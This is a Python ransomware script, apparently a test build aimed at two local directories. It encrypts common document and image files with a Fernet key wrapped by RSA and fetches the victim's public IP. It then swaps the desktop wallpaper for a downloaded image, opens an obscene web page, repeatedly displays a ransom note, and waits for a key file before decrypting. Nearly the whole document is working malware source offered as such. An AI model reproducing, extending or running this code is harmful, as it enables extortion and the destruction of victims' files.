#!/usr/bin/env python3

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
from cryptography.fernet import Fernet
import os
import time
import shutil
import requests
import ctypes
import subprocess
import urllib.request
import threading
from glob import glob
import webbrowser
from time import sleep
from pathlib import Path

class GenerateRsaKey:

    def generate_rsa_key(self):
        key = RSA.generate(2048)

        private_key = key.export_key()
        with open('private_key.pem', 'wb') as f:
            f.write(private_key)
            f.close()

        public_key = key.publickey().export_key()
        with open('public_key.pem', 'wb') as f:
            f.write(public_key)
            f.close()

class Ransom:

    user = os.getlogin()
    paths = os.getcwd()

    # Target directory testing here!
    target_directory = [
        'D:\localRoot',
        'D:\localRooty'
    ]

    file_exts = (
        '.txt', '.py', '.jpg', '.png', '.jpeg', '.pdf'
    )

    def __init__(self):
        # Fernet key here!
        self.key = None
        # For encrypt/decrypt file
        self.crypter = None
        # RSA public_key for Encrypt/Decrypt fernet key
        self.public_key = None

        self.sysRoot = os.path.expanduser('~')
        self.publicIP = requests.get('https://api.ipify.org').text

    def generate_key(self):
        # Generate key
        self.key = Fernet.generate_key()
        # Encrypt/Decrypt file
        self.crypter = Fernet(self.key)

    def write_key(self):
        with open('fernet_key.txt', 'wb') as ky:
            ky.write(self.key)

    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as ky:
            fernet_key = ky.read()

        with open('fernet_key.txt', 'wb') as ek:
            self.public_key = RSA.import_key(open('public_key.pem').read())
            public_crypter = PKCS1_OAEP.new(self.public_key)
            encrypt_fernet_key = public_crypter.encrypt(fernet_key)

            ek.write(encrypt_fernet_key)

        with open(f'{self.sysRoot}/Desktop/CALL_ME.txt', 'wb') as f:
            f.write(encrypt_fernet_key)

        self.key = encrypt_fernet_key

        self.crypter = None

    def crypter_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as fp:
            data = fp.read()

            if not encrypted:
                print(data)

                _data = self.crypter.encrypt(data)
                print(_data)

            else:
                _data = self.crypter.decrypt(data)
                print(_data)

        with open(file_path, 'wb') as f:
            f.write(_data)
            f.close()

    def crypter_system(self, encrypted=False):
        for path in self.target_directory:
            file_paths = glob(path + '/**', recursive=True)

            for file_path in file_paths:
                if not file_path.endswith(self.file_exts):
                    pass

                elif not encrypted:
                    self.crypter_file(file_path)

                else:
                    self.crypter_file(file_path, encrypted=True)


    def fuck_you(self):
        url = 'http://sfwallpaper.com/images/fuck-wallpaper-14.jpg'
        webbrowser.open(url)

    def change_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        path = f'{self.sysRoot}/Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)

    def ransom_note(self):
        TIME = time.strftime('%d/%m/%Y %H:%M:%S %p')
        msg = f'''{TIME}\n
User: {self.user}
Ip Address: {self.publicIP}
Current Directory: {self.paths}\n
All your files are encrypted!\nYou have to put the PUT_ME_ON_DESKTOP.txt file in {self.sysRoot}/Desktop/PUT IT HERE! so that all your files are successfully decrypted
'''
        with open('RANSOM_NOTE.txt', 'w') as file:  # Make a Ransom note
            file.write(msg)
            file.close()

    def show_warning(self):
        count = 0
        while True:
            time.sleep(2)
            # Open the Ransom note
            subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])

            time.sleep(10)
            count += 1
            if count == 5:
                break

    def put_me_on_desktop(self):
        while True:
            try:
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypter_system(encrypted=True)
                    sleep(1)
                    os.remove(f'{self.paths}/private_key.pem')
                    os.remove(f'{self.paths}/public_key.pem')
                    os.remove(f'{self.paths}/fernet_key.txt')
                    break

            except Exception as err:
                print(err)
                pass

            sleep(10)
            print('Checking fernet key on Desktop') # Debugging/Testing

def main():
    rsa = GenerateRsaKey()
    rsa.generate_rsa_key()

    ransom = Ransom()
    ransom.generate_key()
    ransom.crypter_system()
    ransom.write_key()
    ransom.encrypt_fernet_key()
    ransom.change_background()
    ransom.fuck_you()
    ransom.ransom_note()

    t1 = threading.Thread(target=ransom.show_warning)
    t2 = threading.Thread(target=ransom.put_me_on_desktop)
    print('Ransom note is the top window - do nothing')  # Debugging/Testing
    t1.start()
    print('RansomWare: Waiting for you to give target machine document that will un-encrypt machine')  # Debugging/Testing
    t2.start()
    print('RansomWare: Target machine has been un-encrypted')  # Debugging/Testing
    print('RansomWare: Completed')  # Debugging/Testing

if __name__ == '__main__':
    main()

